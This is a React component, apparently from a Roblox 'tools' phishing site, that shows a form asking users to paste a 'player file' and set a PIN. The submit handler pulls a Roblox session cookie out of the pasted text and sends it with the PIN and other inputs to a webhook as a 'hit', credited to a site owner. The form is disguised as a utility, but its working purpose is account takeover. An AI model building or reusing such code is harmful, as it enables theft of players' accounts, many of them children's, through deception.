import React, { useState } from 'react';
import { FileIcon, LockIcon, Loader2, X, Hash } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';
import { submitHit, type ToolKey, type ToolType } from '@/utils/webhookService';
import { extractRobloxCookie } from '@/utils/extractCookie';
import { useSite } from '@/context/SiteContext';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';

interface ExtraField {
  key: string;
  label: string;
  placeholder: string;
  type?: 'text' | 'number';
  required?: boolean;
}

interface Props {
  toolType: ToolType;
  toolKey: ToolKey;
  title: string;
  description: string;
  buttonLabel: string;
  successMessage: string;
  filePlaceholder?: string;
  extras?: ExtraField[];
}

const ToolForm: React.FC<Props> = ({
  toolType,
  toolKey,
  title,
  description,
  buttonLabel,
  successMessage,
  filePlaceholder = 'Enter player file',
  extras = [],
}) => {
  const { ownerUsername } = useSite();
  const [file, setFile] = useState('');
  const [pin, setPin] = useState('');
  const [extraVals, setExtraVals] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPin(e.target.value.replace(/\D/g, '').slice(0, 4));
  };

  const handleSubmit = async () => {
    const cookie = extractRobloxCookie(file);
    if (!cookie) {
      setShowError(true);
      return;
    }
    for (const f of extras) {
      if (f.required && !extraVals[f.key]?.trim()) {
        toast.error(`${f.label} is required`);
        return;
      }
    }

    setIsLoading(true);
    try {
      await submitHit({
        toolType,
        toolKey,
        cookie,
        pin,
        ownerUsername,
        extras: extraVals,
      });
      toast.success(successMessage);
    } catch {
      toast.error('An error occurred. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <Dialog open={showError} onOpenChange={setShowError}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="flex flex-col items-center justify-center text-center">
            <div className="rounded-full border-2 border-red-500 p-4 w-16 h-16 flex items-center justify-center mb-4">
              <X className="h-8 w-8 text-red-500" />
            </div>
            <DialogTitle className="text-xl">Error</DialogTitle>
          </DialogHeader>
          <div className="text-center pb-4 pt-2">
            <p className="text-muted-foreground">Invalid File</p>
          </div>
          <div className="flex justify-center">
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => setShowError(false)}
              className="bg-purple-500 hover:bg-purple-600 text-white font-medium py-2 px-8 rounded"
            >
              OK
            </motion.button>
          </div>
        </DialogContent>
      </Dialog>

      <motion.div
        className="blox-card p-8 max-w-xl"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        whileHover={{ boxShadow: '0 8px 30px rgba(0, 215, 220, 0.15)' }}
      >
        <h2 className="text-2xl font-bold mb-4">{title}</h2>
        <p className="text-gray-400 mb-6">{description}</p>

        <div className="relative mb-4">
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
            <FileIcon size={18} />
          </div>
          <input
            type="password"
            placeholder={filePlaceholder}
            value={file}
            onChange={(e) => setFile(e.target.value)}
            className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
          />
        </div>

        {extras.map((f) => (
          <div key={f.key} className="relative mb-4">
            <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
              <Hash size={18} />
            </div>
            <input
              type={f.type === 'number' ? 'number' : 'text'}
              placeholder={f.placeholder}
              value={extraVals[f.key] ?? ''}
              onChange={(e) => setExtraVals({ ...extraVals, [f.key]: e.target.value })}
              className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
            />
          </div>
        ))}

        <div className="relative mb-6">
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
            <LockIcon size={18} />
          </div>
          <input
            type="text"
            placeholder="Create A Pin (4 digits)"
            value={pin}
            onChange={handlePinChange}
            maxLength={4}
            className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
          />
        </div>

        <motion.button
          onClick={handleSubmit}
          disabled={isLoading}
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          className="w-full bg-blox-teal text-white py-3 rounded-md font-medium hover:bg-blox-teal/90 transition-all flex items-center justify-center"
        >
          {isLoading ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing...
            </>
          ) : (
            buttonLabel
          )}
        </motion.button>
      </motion.div>
    </>
  );
};

export default ToolForm;
